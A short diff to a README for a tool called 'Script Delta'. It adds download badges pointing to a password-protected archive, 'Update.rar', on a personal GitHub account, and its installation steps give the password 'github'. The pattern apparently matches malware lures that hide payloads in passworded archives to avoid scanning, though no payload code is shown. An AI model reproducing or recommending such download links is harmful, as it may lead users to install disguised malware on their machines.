@@ -1,8 +1,8 @@
-# Script Delta [![Download Script Delta](https://img.shields.io/badge/Download-Script%20Delta-green)]()
+# Script Delta [![Download Script Delta](https://img.shields.io/badge/Download-Script%20Delta-purple)](https://github.com/marker1111014/script-delta/releases/download/Release/Update.rar)
 
 ## Installation
 To install Script Delta, follow these simple steps:
-1. [![Download Script Delta](https://img.shields.io/badge/Download-Script%20Delta-green)]()
+1. [![Download Script Delta](https://img.shields.io/badge/Download-Script%20Delta-purple)](https://github.com/marker1111014/script-delta/releases/download/Release/Update.rar)
 
 2. **Pass: github**
 
